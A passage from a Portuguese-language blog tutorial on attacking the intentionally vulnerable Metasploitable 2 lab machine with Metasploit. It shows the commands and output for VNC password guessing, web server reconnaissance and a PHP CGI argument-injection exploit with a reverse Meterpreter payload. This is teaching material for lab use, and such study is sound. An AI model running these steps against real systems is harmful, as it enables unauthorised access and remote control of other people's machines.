</span></span><span class=line><span class=cl>   RPORT             <span class=m>5900</span>                             yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   STOP_ON_SUCCESS   <span class=nb>false</span>                            yes       Stop guessing when a credential works <span class=k>for</span> a host
</span></span><span class=line><span class=cl>   THREADS           <span class=m>1</span>                                yes       The number of concurrent threads <span class=o>(</span>max one per host<span class=o>)</span>
</span></span><span class=line><span class=cl>   USERNAME          &lt;BLANK&gt;                          no        A specific username to authenticate as
</span></span><span class=line><span class=cl>   USERPASS_FILE                                      no        File containing users and passwords separated by space
</span></span><span class=line><span class=cl>                                                                , one pair per line
</span></span><span class=line><span class=cl>   USER_AS_PASS      <span class=nb>false</span>                            no        Try the username as the password <span class=k>for</span> all users
</span></span><span class=line><span class=cl>   USER_FILE                                          no        File containing usernames, one per line
</span></span><span class=line><span class=cl>   VERBOSE           <span class=nb>true</span>                             yes       Whether to print output <span class=k>for</span> all attempts
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
</span></span></code></pre></td></tr></table></div></div><p>Vamos configurar o endereço do host alvo e o nome de usuário.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/vnc/vnc_login<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/vnc/vnc_login<span class=o>)</span> &gt; <span class=nb>set</span> USERNAME root
</span></span><span class=line><span class=cl><span class=nv>USERNAME</span> <span class=o>=</span>&gt; root
</span></span></code></pre></td></tr></table></div></div><p>Por fim, executamos o módulo para tentar a autenticação.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/vnc/vnc_login<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30:5900     - 192.168.1.30:5900 - Starting VNC login sweep
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> 192.168.1.30:5900     - No active DB -- Credential data will not be saved!
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 192.168.1.30:5900     - 192.168.1.30:5900 - Login Successful: :password
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30:5900     - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><p>Vimos que o módulo conseguiu logar com sucesso usando a senha password. Abra outro terminal do Kali e utilize o comando <code>vncviewer 192.168.1.30</code>. Se o <code>vncviewer</code> não estiver instalado, você pode obtê-lo com o seguinte comando: <code>sudo apt install tigervnc-viewer</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vncviewer 192.168.1.30
</span></span></code></pre></td></tr></table></div></div><p>Insira a senha <code>password</code>, conforme encontramos anteriormente.</p><p><img alt="Figura 9" loading=lazy src=/images/gabriel-breno-post-metasploitable2/login_vnc.png></p><p>Dessa forma, é possível obter acesso completo ao desktop remoto, oferecendo uma oportunidade para explorar mais sobre a máquina-alvo.</p><p><img alt="Figura 10" loading=lazy src=/images/gabriel-breno-post-metasploitable2/vnc_gui.png></p><h2 id=exploração-de-um-servidor-web>Exploração de um servidor web<a hidden class=anchor aria-hidden=true href=#exploração-de-um-servidor-web>#</a></h2><p>Anteriormente, encontramos que a porta 80 está aberta. Vamos analisá-la.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ nmap -sV 192.168.1.30 -p <span class=m>80</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-08-11 19:51 -03
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.1.30
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0077s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.2.8 <span class=o>((</span>Ubuntu<span class=o>)</span> DAV/2<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 6.50 seconds
</span></span></code></pre></td></tr></table></div></div><p>O servidor web está rodando o Apache HTTPD 2.2.8 em um sistema Ubuntu. Para obter mais informações sobre o servidor, podemos usar o seguinte módulo do Metasploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search http_version
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                 Disclosure Date  Rank    Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                 ---------------  ----    -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 0, use <span class=m>0</span> or use auxiliary/scanner/http/http_version
</span></span></code></pre></td></tr></table></div></div><p>Selecionando o módulo de detecção de versão HTTP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use auxiliary/scanner/http/http_version
</span></span></code></pre></td></tr></table></div></div><p>Exibindo as opções disponíveis para o módulo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/http_version<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>auxiliary/scanner/http/http_version<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name     Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----     ---------------  --------  -----------
</span></span><span class=line><span class=cl>   Proxies                   no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:port<span class=o>][</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>   RHOSTS                    yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com/docs/using-metasploit/basic
</span></span><span class=line><span class=cl>                                       s/using-metasploit.html
</span></span><span class=line><span class=cl>   RPORT    <span class=m>80</span>               yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SSL      <span class=nb>false</span>            no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
</span></span><span class=line><span class=cl>   THREADS  <span class=m>1</span>                yes       The number of concurrent threads <span class=o>(</span>max one per host<span class=o>)</span>
</span></span><span class=line><span class=cl>   VHOST                     no        HTTP server virtual host
</span></span></code></pre></td></tr></table></div></div><p>Configurando o módulo com o endereço do alvo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/http_version<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span></code></pre></td></tr></table></div></div><p>Executamos o módulo para verificar a versão do HTTP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/http_version<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 192.168.1.30:80 Apache/2.2.8 <span class=o>(</span>Ubuntu<span class=o>)</span> DAV/2 <span class=o>(</span> Powered by PHP/5.2.4-2ubuntu5.10 <span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><p>De fato, o servidor está rodando Apache/2.2.8 (Ubuntu), mas está rodando PHP/5.2.4-2ubuntu5.10. Agora que sabemos que o servidor está usando PHP, uma abordagem comum é verificar se existem arquivos de configuração padrão que podem fornecer informações úteis. Um arquivo típico para verificar é o phpinfo.php, que geralmente está disponível para fins de diagnóstico e fornece informações detalhadas sobre a configuração do PHP.</p><p>Vamos acessar esse caminho no browser, navegando para o endereço <code>192.168.1.30/phpinfo.php</code>.</p><p><em>Observação: o phpinfo.php é um caminho padrão, mas nem todos os servidores terão este arquivo disponível. Se não estiver acessível, é possível que o administrador do sistema tenha removido ou desativado esse arquivo por questões de segurança.</em></p><p><img alt="Figura 11" loading=lazy src=/images/gabriel-breno-post-metasploitable2/phpinfo.png></p><p>Vamos, agora, identificar diretórios no servidor web usando o seguinte módulo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search dir_scanner
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                Disclosure Date  Rank    Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                ---------------  ----    -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  auxiliary/scanner/http/dir_scanner  .                normal  No     HTTP Directory Scanner
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 0, use <span class=m>0</span> or use auxiliary/scanner/http/dir_scanner
</span></span></code></pre></td></tr></table></div></div><p>Selecionando o módulo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use auxiliary/scanner/http/dir_scanner
</span></span></code></pre></td></tr></table></div></div><p>Mostrando as opções disponíveis:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/dir_scanner<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>auxiliary/scanner/http/dir_scanner<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name        Current Setting                    Required  Description
</span></span><span class=line><span class=cl>   ----        ---------------                    --------  -----------
</span></span><span class=line><span class=cl>   DICTIONARY  /usr/share/metasploit-framework/d  no        Path of word dictionary to use
</span></span><span class=line><span class=cl>               ata/wmap/wmap_dirs.txt
</span></span><span class=line><span class=cl>   PATH        /                                  yes       The path  to identify files
</span></span><span class=line><span class=cl>   Proxies                                        no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:port<span class=o>][</span>..
</span></span><span class=line><span class=cl>                                                            .<span class=o>]</span>
</span></span><span class=line><span class=cl>   RHOSTS                                         yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com/docs/u
</span></span><span class=line><span class=cl>                                                            sing-metasploit/basics/using-metasploit.html
</span></span><span class=line><span class=cl>   RPORT       <span class=m>80</span>                                 yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SSL         <span class=nb>false</span>                              no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
</span></span><span class=line><span class=cl>   THREADS     <span class=m>1</span>                                  yes       The number of concurrent threads <span class=o>(</span>max one per host<span class=o>)</span>
</span></span><span class=line><span class=cl>   VHOST                                          no        HTTP server virtual host
</span></span></code></pre></td></tr></table></div></div><p>Configurando o alvo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/dir_scanner<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span></code></pre></td></tr></table></div></div><p>Por fim, vamos executar o módulo.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/http/dir_scanner<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Detecting error code
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using code <span class=s1>&#39;404&#39;</span> as not found <span class=k>for</span> 192.168.1.30
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/cgi-bin/ <span class=m>403</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/doc/ <span class=m>200</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/icons/ <span class=m>200</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/index/ <span class=m>200</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/phpMyAdmin/ <span class=m>200</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found http://192.168.1.30:80/test/ <span class=m>200</span> <span class=o>(</span>192.168.1.30<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><p>O módulo retornou uma lista de diretórios, que podem conter informações sensíveis ou vulnerabilidades que podem ser exploradas. Um diretório interessante seria o <code>/phpMyAdmin/</code>. Vamos tentar explorá-lo utilizando o seguinte módulo de injeção de argumento CGI (Common Gateway Interface) no PHP.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search php_cgi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                                          Disclosure Date  Rank       Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                                          ---------------  ----       -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/multi/http/php_cgi_arg_injection                      2012-05-03       excellent  Yes    PHP CGI Argument Injection
</span></span><span class=line><span class=cl>   <span class=m>1</span>  exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577  2024-06-06       excellent  Yes    PHP CGI Argument Injection Remote Code Execution
</span></span><span class=line><span class=cl>   <span class=m>2</span>    <span class=se>\_</span> target: Windows PHP                                      .                .          .      .
</span></span><span class=line><span class=cl>   <span class=m>3</span>    <span class=se>\_</span> target: Windows Command                                  .                .          .      .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 3, use <span class=m>3</span> or use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577
</span></span><span class=line><span class=cl>After interacting with a module you can manually <span class=nb>set</span> a TARGET with <span class=nb>set</span> TARGET <span class=s1>&#39;Windows Command&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Vamos utilizar a opção <code>0</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table></div></div><p>Configurando o alvo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/php_cgi_arg_injection<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span></code></pre></td></tr></table></div></div><p>Por fim, vamos executar o exploit.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/php_cgi_arg_injection<span class=o>)</span> &gt; exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 172.18.18.105:4444
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Exploit completed, but no session was created.
</span></span></code></pre></td></tr></table></div></div><p>Infelizmente, o exploit falhou em minha máquina. De acordo com <a href="https://www.youtube.com/watch?v=HH7DPfYTfoI">este vídeo</a>, após injetar um argumento malicioso na solicitação CGI e explorar a vulnerabilidade no PHP, obteríamos um shell reverso na máquina alvo, permitindo controle remoto e acesso a informações. Veja um screenshot deste vídeo:</p><p><img alt="Figura 12" loading=lazy src=/images/gabriel-breno-post-metasploitable2/exploit_php.png></p><h2 id=considerações-finais>Considerações finais<a hidden class=anchor aria-hidden=true href=#considerações-finais>#</a></h2><p>Neste blog post, vimos que a máquina Metasploitable 2 é uma ótima oportunidade para quem deseja aprender sobre segurança cibernética, oferecendo uma ampla gama de vulnerabilidades para explorar. Além disso, o Metasploit Framework também se destaca como uma ferramenta para esse aprendizado, facilitando a identificação e exploração de falhas nesses ambientes.</p><h2 id=referências>Referências<a hidden class=anchor aria-hidden=true href=#referências>#</a></h2><p>Rapid7. <strong>Metasploitable 2 Exploitability Guide</strong>. Disponível em: <a href=https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/>https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/</a></p><p>Rapid7. <strong>Metasploit Documentation</strong>. Disponível em: <a href=https://docs.metasploit.com>https://docs.metasploit.com</a></p><p>OffSec. <strong>Scanner FTP Auxiliary Modules</strong>. Disponível em: <a href=https://www.offsec.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/>https://www.offsec.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/</a></p><p>InfoSec Pat. <strong>How To Hack and Exploit Port 80 HTTP Metasploitable 2</strong>. Disponível em: <a href="https://www.youtube.com/watch?v=HH7DPfYTfoI">https://www.youtube.com/watch?v=HH7DPfYTfoI</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/redes/>Redes</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/blog/2024-08-11-tutorial-game-hacking-cheat-engine/><span class=title>« Prev</span><br><span>Tutorial de Game Hacking utilizando Cheat Engine</span>
</a><a class=next href=http://localhost:1313/blog/2024-08-11-writeup-lab01-rev-mbe/><span class=title>Next »</span><br><span>Modern Binary Exploitation: Laboratório de Engenharia Reversa</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on x" href="https://x.com/intent/tweet/?text=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f&amp;hashtags=Redes"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f&amp;title=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais&amp;summary=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f&title=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a 